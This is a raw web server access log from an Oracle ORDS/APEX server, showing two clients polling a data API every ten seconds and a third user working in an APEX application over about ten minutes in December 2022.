195.222.149.195 - - [01/Dec/2022:00:32:32 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:24:05&vEND_DT=30.11.2022%2022:34:05 HTTP/1.1" 200 28059
46.146.210.91 - - [01/Dec/2022:00:32:35 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:22:34&vEND_DT=01.12.2022%2000:32:34 HTTP/1.1" 200 18965
195.222.149.195 - - [01/Dec/2022:00:32:43 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:24:15&vEND_DT=30.11.2022%2022:34:15 HTTP/1.1" 200 26530
46.146.210.91 - - [01/Dec/2022:00:32:45 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:22:44&vEND_DT=01.12.2022%2000:32:44 HTTP/1.1" 200 17032
195.222.149.195 - - [01/Dec/2022:00:32:53 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:24:25&vEND_DT=30.11.2022%2022:34:25 HTTP/1.1" 200 28046
46.146.210.91 - - [01/Dec/2022:00:32:56 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:22:54&vEND_DT=01.12.2022%2000:32:54 HTTP/1.1" 200 17032
195.222.149.195 - - [01/Dec/2022:00:33:04 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:24:35&vEND_DT=30.11.2022%2022:34:35 HTTP/1.1" 200 32265
46.146.210.91 - - [01/Dec/2022:00:33:06 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:23:04&vEND_DT=01.12.2022%2000:33:04 HTTP/1.1" 200 17032
195.222.149.195 - - [01/Dec/2022:00:33:13 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:24:45&vEND_DT=30.11.2022%2022:34:45 HTTP/1.1" 200 30750
46.146.210.91 - - [01/Dec/2022:00:33:15 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:23:14&vEND_DT=01.12.2022%2000:33:14 HTTP/1.1" 200 15096
195.222.149.195 - - [01/Dec/2022:00:33:22 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:24:55&vEND_DT=30.11.2022%2022:34:55 HTTP/1.1" 200 32680
46.146.210.91 - - [01/Dec/2022:00:33:25 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:23:24&vEND_DT=01.12.2022%2000:33:24 HTTP/1.1" 200 29701
195.222.149.195 - - [01/Dec/2022:00:33:33 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:25:05&vEND_DT=30.11.2022%2022:35:05 HTTP/1.1" 200 32680
195.222.149.195 - - [01/Dec/2022:00:33:44 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:25:15&vEND_DT=30.11.2022%2022:35:15 HTTP/1.1" 200 35732
46.146.210.91 - - [01/Dec/2022:00:33:48 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:23:44&vEND_DT=01.12.2022%2000:33:44 HTTP/1.1" 200 29701
195.222.149.195 - - [01/Dec/2022:00:33:54 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:25:25&vEND_DT=30.11.2022%2022:35:25 HTTP/1.1" 200 37250
94.51.211.239 - - [01/Dec/2022:00:33:59 +0500] "POST /ords/wwv_flow.accept HTTP/1.1" 302 5
195.222.149.195 - - [01/Dec/2022:00:34:05 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:25:35&vEND_DT=30.11.2022%2022:35:35 HTTP/1.1" 200 37250
46.146.210.91 - - [01/Dec/2022:00:34:06 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:24:04&vEND_DT=01.12.2022%2000:34:04 HTTP/1.1" 200 29701
94.51.211.239 - - [01/Dec/2022:00:34:07 +0500] "POST /ords/wwv_flow.show HTTP/1.1" 200 12
195.222.149.195 - - [01/Dec/2022:00:34:14 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:25:45&vEND_DT=30.11.2022%2022:35:45 HTTP/1.1" 200 40698
94.51.211.239 - - [01/Dec/2022:00:34:20 +0500] "POST /ords/wwv_flow.accept HTTP/1.1" 302 5
195.222.149.195 - - [01/Dec/2022:00:34:22 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:25:55&vEND_DT=30.11.2022%2022:35:55 HTTP/1.1" 200 40698
94.51.211.239 - - [01/Dec/2022:00:34:25 +0500] "GET /ords/f?p=147:2:11876333479912::::: HTTP/1.1" 200 102476
46.146.210.91 - - [01/Dec/2022:00:34:25 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:24:24&vEND_DT=01.12.2022%2000:34:24 HTTP/1.1" 200 29701
94.51.211.239 - - [01/Dec/2022:00:34:30 +0500] "POST /ords/wwv_flow.accept HTTP/1.1" 302 5
195.222.149.195 - - [01/Dec/2022:00:34:32 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:26:05&vEND_DT=30.11.2022%2022:36:05 HTTP/1.1" 200 40698
46.146.210.91 - - [01/Dec/2022:00:34:36 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:24:34&vEND_DT=01.12.2022%2000:34:34 HTTP/1.1" 200 29701
195.222.149.195 - - [01/Dec/2022:00:34:42 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:26:15&vEND_DT=30.11.2022%2022:36:15 HTTP/1.1" 200 40698
46.146.210.91 - - [01/Dec/2022:00:34:45 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:24:44&vEND_DT=01.12.2022%2000:34:44 HTTP/1.1" 200 29701
94.51.211.239 - - [01/Dec/2022:00:34:45 +0500] "GET /ords/f?p=147:2:11876333479912::::: HTTP/1.1" 200 102181
195.222.149.195 - - [01/Dec/2022:00:34:54 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:26:25&vEND_DT=30.11.2022%2022:36:25 HTTP/1.1" 200 40698
46.146.210.91 - - [01/Dec/2022:00:34:57 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:24:54&vEND_DT=01.12.2022%2000:34:54 HTTP/1.1" 200 29701
195.222.149.195 - - [01/Dec/2022:00:35:05 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:26:35&vEND_DT=30.11.2022%2022:36:35 HTTP/1.1" 200 40698
94.51.211.239 - - [01/Dec/2022:00:35:12 +0500] "GET /ords/f?p=147:2:11876333479912::::: HTTP/1.1" 200 102180
195.222.149.195 - - [01/Dec/2022:00:35:13 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:26:45&vEND_DT=30.11.2022%2022:36:45 HTTP/1.1" 200 38765
46.146.210.91 - - [01/Dec/2022:00:35:16 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:25:14&vEND_DT=01.12.2022%2000:35:14 HTTP/1.1" 200 29701
195.222.149.195 - - [01/Dec/2022:00:35:24 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:26:55&vEND_DT=30.11.2022%2022:36:55 HTTP/1.1" 200 38765
195.222.149.195 - - [01/Dec/2022:00:35:33 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:27:05&vEND_DT=30.11.2022%2022:37:05 HTTP/1.1" 200 36348
46.146.210.91 - - [01/Dec/2022:00:35:36 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:25:34&vEND_DT=01.12.2022%2000:35:34 HTTP/1.1" 200 29701
195.222.149.195 - - [01/Dec/2022:00:35:42 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:27:15&vEND_DT=30.11.2022%2022:37:15 HTTP/1.1" 200 36348
46.146.210.91 - - [01/Dec/2022:00:35:45 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:25:44&vEND_DT=01.12.2022%2000:35:44 HTTP/1.1" 200 29701
195.222.149.195 - - [01/Dec/2022:00:35:52 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:27:25&vEND_DT=30.11.2022%2022:37:25 HTTP/1.1" 200 36347
46.146.210.91 - - [01/Dec/2022:00:35:55 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:25:54&vEND_DT=01.12.2022%2000:35:54 HTTP/1.1" 200 26754
195.222.149.195 - - [01/Dec/2022:00:36:03 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:27:35&vEND_DT=30.11.2022%2022:37:35 HTTP/1.1" 200 37863
46.146.210.91 - - [01/Dec/2022:00:36:05 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:26:04&vEND_DT=01.12.2022%2000:36:04 HTTP/1.1" 200 26754
195.222.149.195 - - [01/Dec/2022:00:36:12 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:27:45&vEND_DT=30.11.2022%2022:37:45 HTTP/1.1" 200 39393
46.146.210.91 - - [01/Dec/2022:00:36:15 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:26:14&vEND_DT=01.12.2022%2000:36:14 HTTP/1.1" 200 26754
195.222.149.195 - - [01/Dec/2022:00:36:22 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:27:55&vEND_DT=30.11.2022%2022:37:55 HTTP/1.1" 200 36938
46.146.210.91 - - [01/Dec/2022:00:36:25 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:26:24&vEND_DT=01.12.2022%2000:36:24 HTTP/1.1" 200 37613
195.222.149.195 - - [01/Dec/2022:00:36:32 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:28:05&vEND_DT=30.11.2022%2022:38:05 HTTP/1.1" 200 42692
46.146.210.91 - - [01/Dec/2022:00:36:35 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:26:34&vEND_DT=01.12.2022%2000:36:34 HTTP/1.1" 200 37613
195.222.149.195 - - [01/Dec/2022:00:36:42 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:28:15&vEND_DT=30.11.2022%2022:38:15 HTTP/1.1" 200 42692
46.146.210.91 - - [01/Dec/2022:00:36:45 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:26:44&vEND_DT=01.12.2022%2000:36:44 HTTP/1.1" 200 37613
195.222.149.195 - - [01/Dec/2022:00:36:52 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:28:25&vEND_DT=30.11.2022%2022:38:25 HTTP/1.1" 200 44218
46.146.210.91 - - [01/Dec/2022:00:36:55 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:26:54&vEND_DT=01.12.2022%2000:36:54 HTTP/1.1" 200 37613
195.222.149.195 - - [01/Dec/2022:00:37:03 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:28:35&vEND_DT=30.11.2022%2022:38:35 HTTP/1.1" 200 44218
94.51.211.239 - - [01/Dec/2022:00:37:04 +0500] "POST /ords/wwv_flow.show HTTP/1.1" 200 12
46.146.210.91 - - [01/Dec/2022:00:37:05 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:27:04&vEND_DT=01.12.2022%2000:37:04 HTTP/1.1" 200 36097
94.51.211.239 - - [01/Dec/2022:00:37:11 +0500] "POST /ords/wwv_flow.accept HTTP/1.1" 302 5
195.222.149.195 - - [01/Dec/2022:00:37:13 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:28:45&vEND_DT=30.11.2022%2022:38:45 HTTP/1.1" 200 44218
46.146.210.91 - - [01/Dec/2022:00:37:15 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:27:14&vEND_DT=01.12.2022%2000:37:14 HTTP/1.1" 200 34569
195.222.149.195 - - [01/Dec/2022:00:37:23 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:28:55&vEND_DT=30.11.2022%2022:38:55 HTTP/1.1" 200 41173
94.51.211.239 - - [01/Dec/2022:00:37:24 +0500] "POST /ords/wwv_flow.accept HTTP/1.1" 302 5
46.146.210.91 - - [01/Dec/2022:00:37:25 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:27:24&vEND_DT=01.12.2022%2000:37:24 HTTP/1.1" 200 28570
94.51.211.239 - - [01/Dec/2022:00:37:30 +0500] "GET /ords/f?p=147:2:11876333479912:::::&success_msg=xODt7fvlIOjn7OXt5e37Lg%7E%7E%2FoM0bXkdPHlszlWP5aN8eOhmDoKSEoirRu3rNGQHXonjf59fdd-LjqXwv7MRUAIWljLUN2ZBEeu0_fvJe11ByFw HTTP/1.1" 200 103037
195.222.149.195 - - [01/Dec/2022:00:37:32 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:29:05&vEND_DT=30.11.2022%2022:39:05 HTTP/1.1" 200 43879
46.146.210.91 - - [01/Dec/2022:00:37:35 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:27:34&vEND_DT=01.12.2022%2000:37:34 HTTP/1.1" 200 28570
94.51.211.239 - - [01/Dec/2022:00:37:41 +0500] "GET /ords/f?p=147:2:11876333479912::::: HTTP/1.1" 200 102181
195.222.149.195 - - [01/Dec/2022:00:37:42 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:29:15&vEND_DT=30.11.2022%2022:39:15 HTTP/1.1" 200 43879
46.146.210.91 - - [01/Dec/2022:00:37:45 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:27:44&vEND_DT=01.12.2022%2000:37:44 HTTP/1.1" 200 28570
195.222.149.195 - - [01/Dec/2022:00:37:52 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:29:25&vEND_DT=30.11.2022%2022:39:25 HTTP/1.1" 200 43879
46.146.210.91 - - [01/Dec/2022:00:37:55 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:27:54&vEND_DT=01.12.2022%2000:37:54 HTTP/1.1" 200 27053
94.51.211.239 - - [01/Dec/2022:00:38:01 +0500] "POST /ords/wwv_flow.show HTTP/1.1" 200 53
195.222.149.195 - - [01/Dec/2022:00:38:02 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:29:35&vEND_DT=30.11.2022%2022:39:35 HTTP/1.1" 200 42367
46.146.210.91 - - [01/Dec/2022:00:38:05 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:28:04&vEND_DT=01.12.2022%2000:38:04 HTTP/1.1" 200 27053
195.222.149.195 - - [01/Dec/2022:00:38:12 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:29:45&vEND_DT=30.11.2022%2022:39:45 HTTP/1.1" 200 42367
46.146.210.91 - - [01/Dec/2022:00:38:15 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:28:14&vEND_DT=01.12.2022%2000:38:14 HTTP/1.1" 200 27053
94.51.211.239 - - [01/Dec/2022:00:38:16 +0500] "GET /ords/wwv_flow.show?p_request=APPLICATION_PROCESS%3DGET_SQL_RESULT&p_flow_id=555&p_flow_step_id=0&p_instance=11876333479912&p_arg_names=F_APPLICATION_ID&p_arg_values=147&p_arg_names=F_FILTER_TEXT&p_arg_values=&p_arg_names=F_LOV_NAME&p_arg_values=2_%D0%A1%D0%A2%D0%90%D0%A2%D0%A3%D0%A1%D0%AB_%D0%9C%D0%9E&p_arg_names=F_FILTER_TEXT2&p_arg_values=&p_arg_names=F_RESULT_COUNT&p_arg_values=50 HTTP/1.1" 200 296
94.51.211.239 - - [01/Dec/2022:00:38:16 +0500] "GET /ords/r/r/files/static/v74Y/ui-anim_basic_16x16.gif HTTP/1.1" 404 5
195.222.149.195 - - [01/Dec/2022:00:38:22 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:29:55&vEND_DT=30.11.2022%2022:39:55 HTTP/1.1" 200 42367
46.146.210.91 - - [01/Dec/2022:00:38:25 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:28:24&vEND_DT=01.12.2022%2000:38:24 HTTP/1.1" 200 25533
195.222.149.195 - - [01/Dec/2022:00:38:32 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:30:05&vEND_DT=30.11.2022%2022:40:05 HTTP/1.1" 200 43892
94.51.211.239 - - [01/Dec/2022:00:38:34 +0500] "POST /ords/wwv_flow.show HTTP/1.1" 200 53
46.146.210.91 - - [01/Dec/2022:00:38:35 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:28:34&vEND_DT=01.12.2022%2000:38:34 HTTP/1.1" 200 25533
195.222.149.195 - - [01/Dec/2022:00:38:42 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:30:15&vEND_DT=30.11.2022%2022:40:15 HTTP/1.1" 200 45411
46.146.210.91 - - [01/Dec/2022:00:38:45 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:28:44&vEND_DT=01.12.2022%2000:38:44 HTTP/1.1" 200 25533
195.222.149.195 - - [01/Dec/2022:00:38:52 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:30:25&vEND_DT=30.11.2022%2022:40:25 HTTP/1.1" 200 46939
46.146.210.91 - - [01/Dec/2022:00:38:55 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:28:54&vEND_DT=01.12.2022%2000:38:54 HTTP/1.1" 200 25533
195.222.149.195 - - [01/Dec/2022:00:39:05 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:30:35&vEND_DT=30.11.2022%2022:40:35 HTTP/1.1" 200 45425
46.146.210.91 - - [01/Dec/2022:00:39:06 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:29:04&vEND_DT=01.12.2022%2000:39:04 HTTP/1.1" 200 25533
94.51.211.239 - - [01/Dec/2022:00:39:09 +0500] "POST /ords/wwv_flow.show HTTP/1.1" 200 53
195.222.149.195 - - [01/Dec/2022:00:39:13 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:30:45&vEND_DT=30.11.2022%2022:40:45 HTTP/1.1" 200 45425
46.146.210.91 - - [01/Dec/2022:00:39:15 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:29:14&vEND_DT=01.12.2022%2000:39:14 HTTP/1.1" 200 33550
94.51.211.239 - - [01/Dec/2022:00:39:17 +0500] "GET /ords/wwv_flow.show?p_request=APPLICATION_PROCESS%3DGET_SQL_RESULT&p_flow_id=555&p_flow_step_id=0&p_instance=11876333479912&p_arg_names=F_APPLICATION_ID&p_arg_values=147&p_arg_names=F_FILTER_TEXT&p_arg_values=&p_arg_names=F_LOV_NAME&p_arg_values=2_%D0%A1%D0%A2%D0%90%D0%A2%D0%A3%D0%A1%D0%AB_%D0%9C%D0%9E&p_arg_names=F_FILTER_TEXT2&p_arg_values=&p_arg_names=F_RESULT_COUNT&p_arg_values=50 HTTP/1.1" 200 296
94.51.211.239 - - [01/Dec/2022:00:39:17 +0500] "GET /ords/r/r/files/static/v74Y/ui-anim_basic_16x16.gif HTTP/1.1" 404 5
195.222.149.195 - - [01/Dec/2022:00:39:23 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:30:55&vEND_DT=30.11.2022%2022:40:55 HTTP/1.1" 200 48138
46.146.210.91 - - [01/Dec/2022:00:39:25 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:29:24&vEND_DT=01.12.2022%2000:39:24 HTTP/1.1" 200 33550
195.222.149.195 - - [01/Dec/2022:00:39:33 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:31:05&vEND_DT=30.11.2022%2022:41:05 HTTP/1.1" 200 48138
46.146.210.91 - - [01/Dec/2022:00:39:35 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:29:34&vEND_DT=01.12.2022%2000:39:34 HTTP/1.1" 200 33550
195.222.149.195 - - [01/Dec/2022:00:39:43 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:31:15&vEND_DT=30.11.2022%2022:41:15 HTTP/1.1" 200 48138
46.146.210.91 - - [01/Dec/2022:00:39:45 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:29:44&vEND_DT=01.12.2022%2000:39:44 HTTP/1.1" 200 33550
94.51.211.239 - - [01/Dec/2022:00:39:47 +0500] "POST /ords/wwv_flow.ajax HTTP/1.1" 200 30674
195.222.149.195 - - [01/Dec/2022:00:39:53 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:31:25&vEND_DT=30.11.2022%2022:41:25 HTTP/1.1" 200 48138
46.146.210.91 - - [01/Dec/2022:00:39:55 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:29:54&vEND_DT=01.12.2022%2000:39:54 HTTP/1.1" 200 33550
195.222.149.195 - - [01/Dec/2022:00:40:04 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:31:35&vEND_DT=30.11.2022%2022:41:35 HTTP/1.1" 200 46622
46.146.210.91 - - [01/Dec/2022:00:40:06 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:30:04&vEND_DT=01.12.2022%2000:40:04 HTTP/1.1" 200 30838
195.222.149.195 - - [01/Dec/2022:00:40:13 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:31:45&vEND_DT=30.11.2022%2022:41:45 HTTP/1.1" 200 45109
46.146.210.91 - - [01/Dec/2022:00:40:16 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:30:14&vEND_DT=01.12.2022%2000:40:14 HTTP/1.1" 200 30838
195.222.149.195 - - [01/Dec/2022:00:40:23 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:31:55&vEND_DT=30.11.2022%2022:41:55 HTTP/1.1" 200 45109
46.146.210.91 - - [01/Dec/2022:00:40:25 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:30:24&vEND_DT=01.12.2022%2000:40:24 HTTP/1.1" 200 30838
195.222.149.195 - - [01/Dec/2022:00:40:33 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:32:05&vEND_DT=30.11.2022%2022:42:05 HTTP/1.1" 200 45109
46.146.210.91 - - [01/Dec/2022:00:40:35 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:30:34&vEND_DT=01.12.2022%2000:40:34 HTTP/1.1" 200 30838
195.222.149.195 - - [01/Dec/2022:00:40:43 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:32:15&vEND_DT=30.11.2022%2022:42:15 HTTP/1.1" 200 45109
46.146.210.91 - - [01/Dec/2022:00:40:45 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:30:44&vEND_DT=01.12.2022%2000:40:44 HTTP/1.1" 200 26617
195.222.149.195 - - [01/Dec/2022:00:40:53 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:32:25&vEND_DT=30.11.2022%2022:42:25 HTTP/1.1" 200 46625
46.146.210.91 - - [01/Dec/2022:00:40:55 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:30:54&vEND_DT=01.12.2022%2000:40:54 HTTP/1.1" 200 26617
195.222.149.195 - - [01/Dec/2022:00:41:05 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:32:35&vEND_DT=30.11.2022%2022:42:35 HTTP/1.1" 200 48140
46.146.210.91 - - [01/Dec/2022:00:41:06 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:31:04&vEND_DT=01.12.2022%2000:41:04 HTTP/1.1" 200 26617
195.222.149.195 - - [01/Dec/2022:00:41:15 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:32:45&vEND_DT=30.11.2022%2022:42:45 HTTP/1.1" 200 48140
195.222.149.195 - - [01/Dec/2022:00:41:24 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:32:55&vEND_DT=30.11.2022%2022:42:55 HTTP/1.1" 200 48140
46.146.210.91 - - [01/Dec/2022:00:41:25 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:31:24&vEND_DT=01.12.2022%2000:41:24 HTTP/1.1" 200 26617
195.222.149.195 - - [01/Dec/2022:00:41:33 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:33:05&vEND_DT=30.11.2022%2022:43:05 HTTP/1.1" 200 48140
46.146.210.91 - - [01/Dec/2022:00:41:36 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:31:34&vEND_DT=01.12.2022%2000:41:34 HTTP/1.1" 200 26617
94.51.211.239 - - [01/Dec/2022:00:41:40 +0500] "POST /ords/wwv_flow.show HTTP/1.1" 200 1569442
195.222.149.195 - - [01/Dec/2022:00:41:43 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:33:15&vEND_DT=30.11.2022%2022:43:15 HTTP/1.1" 200 48140
46.146.210.91 - - [01/Dec/2022:00:41:45 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:31:44&vEND_DT=01.12.2022%2000:41:44 HTTP/1.1" 200 25103
195.222.149.195 - - [01/Dec/2022:00:41:53 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:33:25&vEND_DT=30.11.2022%2022:43:25 HTTP/1.1" 200 48140
46.146.210.91 - - [01/Dec/2022:00:41:55 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:31:54&vEND_DT=01.12.2022%2000:41:54 HTTP/1.1" 200 25103
195.222.149.195 - - [01/Dec/2022:00:42:05 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:33:35&vEND_DT=30.11.2022%2022:43:35 HTTP/1.1" 200 48140
